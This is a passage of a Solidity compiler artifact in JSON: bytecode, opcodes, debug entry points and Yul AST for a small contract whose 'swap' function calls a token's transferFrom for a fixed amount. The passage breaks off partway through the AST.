b5f61025784828501610221565b9150509291505056fea264697066735822122065e36d6835a8cee07f23408d2e31fba2ce6120f655b7322afb7cd02d04e924b564736f6c634300081d0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xE JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x296 DUP1 PUSH2 0x1C PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x29 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x6B76484E EQ PUSH2 0x2D JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x47 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x42 SWAP2 SWAP1 PUSH2 0x133 JUMP JUMPDEST PUSH2 0x49 JUMP JUMPDEST STOP JUMPDEST DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x23B872DD CALLER DUP4 PUSH10 0xD3C21BCECCEDA1000000 PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x90 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x1CB JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0xAC JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xD0 SWAP2 SWAP1 PUSH2 0x235 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x102 DUP3 PUSH2 0xD9 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x112 DUP2 PUSH2 0xF8 JUMP JUMPDEST DUP2 EQ PUSH2 0x11C JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x12D DUP2 PUSH2 0x109 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH0 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x149 JUMPI PUSH2 0x148 PUSH2 0xD5 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x156 DUP6 DUP3 DUP7 ADD PUSH2 0x11F JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0x167 DUP6 DUP3 DUP7 ADD PUSH2 0x11F JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH2 0x17A DUP2 PUSH2 0xF8 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x1B5 PUSH2 0x1B0 PUSH2 0x1AB DUP5 PUSH2 0x180 JUMP JUMPDEST PUSH2 0x192 JUMP JUMPDEST PUSH2 0x189 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1C5 DUP2 PUSH2 0x19B JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x1DE PUSH0 DUP4 ADD DUP7 PUSH2 0x171 JUMP JUMPDEST PUSH2 0x1EB PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0x171 JUMP JUMPDEST PUSH2 0x1F8 PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0x1BC JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x214 DUP2 PUSH2 0x200 JUMP JUMPDEST DUP2 EQ PUSH2 0x21E JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x22F DUP2 PUSH2 0x20B JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x24A JUMPI PUSH2 0x249 PUSH2 0xD5 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x257 DUP5 DUP3 DUP6 ADD PUSH2 0x221 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH6 0xE36D6835A8CE RJUMP 0x7F23 BLOCKHASH DUP14 0x2E BALANCE EXTSTATICCALL LOG2 0xCE PUSH2 0x20F6 SSTORE 0xB7 ORIGIN 0x2A EXTSTATICCALL PUSH29 0xD02D04E924B564736F6C634300081D0033000000000000000000000000 ",
							"sourceMap": "233:222:1:-:0;;;;;;;;;;;;;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@swap_99": {
									"entryPoint": 73,
									"id": 99,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_decode_t_address": {
									"entryPoint": 287,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_t_bool_fromMemory": {
									"entryPoint": 545,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_addresst_address": {
									"entryPoint": 307,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 2
								},
								"abi_decode_tuple_t_bool_fromMemory": {
									"entryPoint": 565,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_t_address_to_t_address_fromStack": {
									"entryPoint": 369,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_t_rational_1000000000000000000000000_by_1_to_t_uint256_fromStack": {
									"entryPoint": 444,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_tuple_t_address_t_address_t_rational_1000000000000000000000000_by_1__to_t_address_t_address_t_uint256__fromStack_reversed": {
									"entryPoint": 459,
									"id": null,
									"parameterSlots": 4,
									"returnSlots": 1
								},
								"allocate_unbounded": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"cleanup_t_address": {
									"entryPoint": 248,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_bool": {
									"entryPoint": 512,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_rational_1000000000000000000000000_by_1": {
									"entryPoint": 384,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint160": {
									"entryPoint": 217,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint256": {
									"entryPoint": 393,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"convert_t_rational_1000000000000000000000000_by_1_to_t_uint256": {
									"entryPoint": 411,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"identity": {
									"entryPoint": 402,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b": {
									"entryPoint": 213,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"validator_revert_t_address": {
									"entryPoint": 265,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								},
								"validator_revert_t_bool": {
									"entryPoint": 523,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nativeSrc": "0:3343:2",
										"nodeType": "YulBlock",
										"src": "0:3343:2",
										"statements": [
											{
												"body": {
													"nativeSrc": "47:35:2",
													"nodeType": "YulBlock",
													"src": "47:35:2",
													"statements": [
														{
															"nativeSrc": "57:19:2",
															"nodeType": "YulAssignment",
															"src": "57:19:2",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "73:2:2",
																		"nodeType": "YulLiteral",
																		"src": "73:2:2",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nativeSrc": "67:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "67:5:2"
																},
																"nativeSrc": "67:9:2",
																"nodeType": "YulFunctionCall",
																"src": "67:9:2"
															},
															"variableNames": [
																{
																	"name": "memPtr",
																	"nativeSrc": "57:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "57:6:2"
																}
															]
														}
													]
												},
												"name": "allocate_unbounded",
												"nativeSrc": "7:75:2",
												"nodeType": "YulFunctionDefinition",
												"returnVariables": [
													{
														"name": "memPtr",
														"nativeSrc": "40:6:2",
														"nodeType": "YulTypedName",
														"src": "40:6:2",
														"type": ""
													}
												],
												"src": "7:75:2"
											},
											{
												"body": {
													"nativeSrc": "177:28:2",
													"nodeType": "YulBlock",
													"src": "177:28:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "194:1:2",
																		"nodeType": "YulLiteral",
																		"src": "194:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "197:1:2",
																		"nodeType": "YulLiteral",
																		"src": "197:1:2",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "187:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "187:6:2"
																},
																"nativeSrc": "187:12:2",
																"nodeType": "YulFunctionCall",
																"src": "187:12:2"
															},
															"nativeSrc": "187:12:2",
															"nodeType": "YulExpressionStatement",
															"src": "187:12:2"
														}
													]
												},
												"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
												"nativeSrc": "88:117:2",
												"nodeType": "YulFunctionDefinition",
												"src": "88:117:2"
											},
											{
												"body": {
													"nativeSrc": "300:28:2",
													"nodeType": "YulBlock",
													"src": "300:28:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "317:1:2",
																		"nodeType": "YulLiteral",
																		"src": "317:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "320:1:2",
																		"nodeType": "YulLiteral",
																		"src": "320:1:2",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "310:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "310:6:2"
																},
																"nativeSrc": "310:12:2",
																"nodeType": "YulFunctionCall",
																"src": "310:12:2"
															},
															"nativeSrc": "310:12:2",
															"nodeType": "YulExpressionStatement",
															"src": "310:12:2"
														}
													]
												},
												"name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
												"nativeSrc": "211:117:2",
												"nodeType": "YulFunctionDefinition",
												"src": "211:117:2"
											},
											{
												"body": {
													"nativeSrc": "379:81:2",
													"nodeType": "YulBlock",
													"src": "379:81:2",
													"statements": [
														{
															"nativeSrc": "389:65:2",
															"nodeType": "YulAssignment",
															"src": "389:65:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "404:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "404:5:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "411:42:2",
																		"nodeType": "YulLiteral",
																		"src": "411:42:2",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nativeSrc": "400:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "400:3:2"
																},
																"nativeSrc": "400:54:2",
																"nodeType": "YulFunctionCall",
																"src": "400:54:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "389:7:2",
																	"nodeType": "YulIdentifier",
																	"src": "389:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nativeSrc": "334:126:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "361:5:2",
														"nodeType": "YulTypedName",
														"src": "361:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "371:7:2",
														"nodeType": "YulTypedName",
														"src": "371:7:2",
														"type": ""
													}
												],
												"src": "334:126:2"
											},
											{
												"body": {
													"nativeSrc": "511:51:2",
													"nodeType": "YulBlock",
													"src": "511:51:2",
													"statements": [
														{
															"nativeSrc": "521:35:2",
															"nodeType": "YulAssignment",
															"src": "521:35:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "550:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "550:5:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nativeSrc": "532:17:2",
																	"nodeType": "YulIdentifier",
																	"src": "532:17:2"
																},
																"nativeSrc": "532:24:2",
																"nodeType": "YulFunctionCall",
																"src": "532:24:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "521:7:2",
																	"nodeType": "YulIdentifier",
																	"src": "521:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nativeSrc": "466:96:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "493:5:2",
														"nodeType": "YulTypedName",
														"src": "493:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "503:7:2",
														"nodeType": "YulTypedName",
														"src": "503:7:2",
														"type": ""
													}
												],
												"src": "466:96:2"
											},
											{
												"body": {
													"nativeSrc": "611:79:2",
													"nodeType": "YulBlock",
													"src": "611:79:2",
													"statements": [
														{
															"body": {
																"nativeSrc": "668:16:2",
																"nodeType": "YulBlock",
																"src": "668:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nativeSrc": "677:1:2",
																					"nodeType": "YulLiteral",
																					"src": "677:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nativeSrc": "680:1:2",
																					"nodeType": "YulLiteral",
																					"src": "680:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nativeSrc": "670:6:2",
																				"nodeType": "YulIdentifier",
																				"src": "670:6:2"
																			},
																			"nativeSrc": "670:12:2",
																			"nodeType": "YulFunctionCall",
																			"src": "670:12:2"
																		},
																		"nativeSrc": "670:12:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "670:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "634:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "634:5:2"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nativeSrc": "659:5:2",
																						"nodeType": "YulIdentifier",
																						"src": "659:5:2"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_address",
																					"nativeSrc": "641:17:2",
																					"nodeType": "YulIdentifier",
																					"src": "641:17:2"
																				},
																				"nativeSrc": "641:24:2",
																				"nodeType": "YulFunctionCall",
																				"src": "641:24:2"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nativeSrc": "631:2:2",
																			"nodeType": "YulIdentifier",
																			"src": "631:2:2"
																		},
																		"nativeSrc": "631:35:2",
																		"nodeType": "YulFunctionCall",
																		"src": "631:35:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nativeSrc": "624:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "624:6:2"
																},
																"nativeSrc": "624:43:2",
																"nodeType": "YulFunctionCall",
																"src": "624:43:2"
															},
															"nativeSrc": "621:63:2",
															"nodeType": "YulIf",
															"src": "621:63:2"
														}
													]
												},
												"name": "validator_revert_t_address",
												"nativeSrc": "568:122:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "604:5:2",
														"nodeType": "YulTypedName",
														"src": "604:5:2",
														"type": ""
													}
												],
												"src": "568:122:2"
											},
											{
												"body": {
													"nativeSrc": "748:87:2",
													"nodeType": "YulBlock",
													"src": "748:87:2",
													"statements": [
														{
															"nativeSrc": "758:29:2",
															"nodeType": "YulAssignment",
															"src": "758:29:2",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nativeSrc": "780:6:2",
																		"nodeType": "YulIdentifier",
																		"src": "780:6:2"
																	}
																],
																"functionName": {
																	"name": "calldataload",
																	"nativeSrc": "767:12:2",
																	"nodeType": "YulIdentifier",
																	"src": "767:12:2"
																},
																"nativeSrc": "767:20:2",
																"nodeType": "YulFunctionCall",
																"src": "767:20:2"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nativeSrc": "758:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "758:5:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "823:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "823:5:2"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_address",
																	"nativeSrc": "796:26:2",
																	"nodeType": "YulIdentifier",
																	"src": "796:26:2"
																},
																"nativeSrc": "796:33:2",
																"nodeType": "YulFunctionCall",
																"src": "796:33:2"
															},
															"nativeSrc": "796:33:2",
															"nodeType": "YulExpressionStatement",
															"src": "796:33:2"
														}
													]
												},
												"name": "abi_decode_t_address",
												"nativeSrc": "696:139:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nativeSrc": "726:6:2",
														"nodeType": "YulTypedName",
														"src": "726:6:2",
														"type": ""
													},
													{
														"name": "end",
														"nativeSrc": "734:3:2",
														"nodeType": "YulTypedName",
														"src": "734:3:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nativeSrc": "742:5:2",
														"nodeType": "YulTypedName",
														"src": "742:5:2",
														"type": ""
													}
												],
												"src": "696:139:2"
											},
											{
												"body": {
													"nativeSrc": "924:391:2",
													"nodeType": "YulBlock",
													"src": "924:391:2",
													"statements": [
														{
															"body": {
																"nativeSrc": "970:83:2",
																"nodeType": "YulBlock",
																"src": "970:83:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																				"nativeSrc": "972:77:2",
																				"nodeType": "YulIdentifier",
																				"src": "972:77:2"
																			},
																			"nativeSrc": "972:79:2",
																			"nodeType": "YulFunctionCall",
																			"src": "972:79:2"
																		},
																		"nativeSrc": "972:79:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "972:79:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nativeSrc": "945:7:2",
																				"nodeType": "YulIdentifier",
																				"src": "945:7:2"
																			},
																			{
																				"name": "headStart",
																				"nativeSrc": "954:9:2",
																				"nodeType": "YulIdentifier",
																				"src": "954:9:2"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nativeSrc": "941:3:2",
																			"nodeType": "YulIdentifier",
																			"src": "941:3:2"
																		},
																		"nativeSrc": "941:23:2",
																		"nodeType": "YulFunctionCall",
																		"src": "941:23:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "966:2:2",
																		"nodeType": "YulLiteral",
																		"src": "966:2:2",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nativeSrc": "937:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "937:3:2"
																},
																"nativeSrc": "937:32:2",
																"nodeType": "YulFunctionCall",
																"src": "937:32:2"
															},
															"nativeSrc": "934:119:2",
															"nodeType": "YulIf",
															"src": "934:119:2"
														},
														{
															"nativeSrc": "1063:117:2",
															"nodeType": "YulBlock",
															"src": "1063:117:2",
															"statements": [
																{
																	"nativeSrc": "1078:15:2",
																	"nodeType": "YulVariableDeclaration",
																	"src": "1078:15:2",
																	"value": {
																		"kind": "number",
																		"nativeSrc": "1092:1:2",
																		"nodeType": "YulLiteral",
																		"src": "1092:1:2",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nativeSrc": "1082:6:2",
																			"nodeType": "YulTypedName",
																			"src": "1082:6:2",
																			"type": ""
																		}
																	]
																},
																{
																	"nativeSrc": "1107:63:2",
																	"nodeType": "YulAssignment",
																	"src": "1107:63:2",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nativeSrc": "1142:9:2",
																						"nodeType": "YulIdentifier",
																						"src": "1142:9:2"
																					},
																					{
																						"name": "offset",
																						"nativeSrc": "1153:6:2",
																						"nodeType": "YulIdentifier",
																						"src": "1153:6:2"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nativeSrc": "1138:3:2",
																					"nodeType": "YulIdentifier",
																					"src": "1138:3:2"
																				},
																				"nativeSrc": "1138:22:2",
																				"nodeType": "YulFunctionCall",
																				"src": "1138:22:2"
																			},
																			{
																				"name": "dataEnd",
																				"nativeSrc": "1162:7:2",
																				"nodeType": "YulIdentifier",
																				"src": "1162:7:2"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_address",
																			"nativeSrc": "1117:20:2",
																			"nodeType": "YulIdentifier",
																			"src": "1117:20:2"
																		},
																		"nativeSrc": "1117:53:2",
																		"nodeType": "YulFunctionCall",
																		"src": "1117:53:2"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nativeSrc": "1107:6:2",
																			"nodeType": "YulIdentifier",
																			"src": "1107:6:2"
																		}
																	]
																}
															]
														},
														{
															"nativeSrc": "1190:118:2",
															"nodeType": "YulBlock",
															"src": "1190:118:2",
															"statements": [
																{
																	"nativeSrc": "1205:16:2",
																	"nodeType": "YulVariableDeclaration",
																	"src": "1205:16:2",
																	"value": {
																		"kind": "number",
																		"nativeSrc": "1219:2:2",
																		"nodeType": "YulLiteral",
																		"src": "1219:2:2",
																		"type": "",
																		"value": "32"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nativeSrc": "1209:6:2",
																			"nodeType": "YulTypedName",
																			"src": "1209:6:2",
																			"type": ""
																		}
																	]
																},
																{
																	"nativeSrc": "1235:63:2",
																	"nodeType": "YulAssignment",
																	"src": "1235:63:2",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nativeSrc": "1270:9:2",
																						"nodeType": "YulIdentifier",
																						"src": "1270:9:2"
																					},
																					{
																						"name": "offset",
																						"nativeSrc": "1281:6:2",
																						"nodeType": "YulIdentifier",
																						"src": "1281:6:2"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nativeSrc": "1266:3:2",
																					"nodeType": "YulIdentifier",
																					"src": "1266:3:2"
																				},
																				"nativeSrc": "1266:22:2",
																				"nodeType": "YulFunctionCall",
																				"src": "1266:22:2"
																			},
																			{
																				"name": "dataEnd",
																				"nativeSrc": "1290:7:2",
																				"nodeType": "YulIdentifier",
																				"src": "1290:7:2"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_address",
																			"nativeSrc": "1245:20:2",
																			"nodeType": "YulIdentifier",
																			"src": "1245:20:2"
																		},
																		"nativeSrc": "1245:53:2",
																		"nodeType": "YulFunctionCall",
																		"src": "1245:53:2"
																	},
																	"variableNames": [
																		{
																			"name": "value1",
																			"nativeSrc": "1235:6:2",
																			"nodeType": "YulIdentifier",
																			"src": "1235:6:2"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_addresst_address",
												"nativeSrc": "841:474:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "886:9:2",
														"nodeType": "YulTypedName",
														"src": "886:9:2",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nativeSrc": "897:7:2",
														"nodeType": "YulTypedName",
														"src": "897:7:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nativeSrc": "909:6:2",
														"nodeType": "YulTypedName",
														"src": "909:6:2",
														"type": ""
													},
													{
														"name": "value1",
														"nativeSrc": "917:6:2",
														"nodeType": "YulTypedName",
														"src": "917:6:2",
														"type": ""
													}
												],
												"src": "841:474:2"
											},
											{
												"body": {
													"nativeSrc": "1386:53:2",
													"nodeType": "YulBlock",
													"src": "1386:53:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nativeSrc": "1403:3:2",
																		"nodeType": "YulIdentifier",
																		"src": "1403:3:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "1426:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "1426:5:2"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_address",
																			"nativeSrc": "1408:17:2",
																			"nodeType": "YulIdentifier",
																			"src": "1408:17:2"
																		},
																		"nativeSrc": "1408:24:2",
																		"nodeType": "YulFunctionCall",
																		"src": "1408:24:2"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "1396:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "1396:6:2"
																},
																"nativeSrc": "1396:37:2",
																"nodeType": "YulFunctionCall",
																"src": "1396:37:2"
															},
															"nativeSrc": "1396:37:2",
															"nodeType": "YulExpressionStatement",
															"src": "1396:37:2"
														}
													]
												},
												"name": "abi_encode_t_address_to_t_address_fromStack",
												"nativeSrc": "1321:118:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "1374:5:2",
														"nodeType": "YulTypedName",
														"src": "1374:5:2",
														"type": ""
													},
													{
														"name": "pos",
														"nativeSrc": "1381:3:2",
														"nodeType": "YulTypedName",
														"src": "1381:3:2",
														"type": ""
													}
												],
												"src": "1321:118:2"
											},
											{
												"body": {
													"nativeSrc": "1522:32:2",
													"nodeType": "YulBlock",
													"src": "1522:32:2",
													"statements": [
														{
															"nativeSrc": "1532:16:2",
															"nodeType": "YulAssignment",
															"src": "1532:16:2",
															"value": {
																"name": "value",
																"nativeSrc": "1543:5:2",
																"nodeType": "YulIdentifier",
																"src": "1543:5:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "1532:7:2",
																	"nodeType": "YulIdentifier",
																	"src": "1532:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_rational_1000000000000000000000000_by_1",
												"nativeSrc": "1445:109:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "1504:5:2",
														"nodeType": "YulTypedName",
														"src": "1504:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "1514:7:2",
														"nodeType": "YulTypedName",
														"src": "1514:7:2",
														"type": ""
													}
												],
												"src": "1445:109:2"
											},
											{
												"body": {
													"nativeSrc": "1605:32:2",
													"nodeType": "YulBlock",
													"src": "1605:32:2",
													"statements": [
														{
															"nativeSrc": "1615:16:2",
															"nodeType": "YulAssignment",
															"src": "1615:16:2",
															"value": {
																"name": "value",
																"nativeSrc": "1626:5:2",
																"nodeType": "YulIdentifier",
																"src": "1626:5:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "1615:7:2",
																	"nodeType": "YulIdentifier",
																	"src": "1615:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint256",
												"nativeSrc": "1560:77:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "1587:5:2",
														"nodeType": "YulTypedName",
														"src": "1587:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "1597:7:2",
														"nodeType": "YulTypedName",
														"src": "1597:7:2",
														"type": ""
													}
												],
												"src": "1560:77:2"
											},
											{
												"body": {
													"nativeSrc": "1675:28:2",
													"nodeType": "YulBlock",
													"src": "1675:28:2",
													"statements": [
														{
															"nativeSrc": "1685:12:2",
															"nodeType": "YulAssignment",
															"src": "1685:12:2",
															"value": {
																"name": "value",
																"nativeSrc": "1692:5:2",
																"nodeType": "YulIdentifier",
																"src": "1692:5:2"
															},
															"variableNames": [
																{
																	"name": "ret",
																	"nativeSrc": "1685:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "1685:3:2"
																}
															]
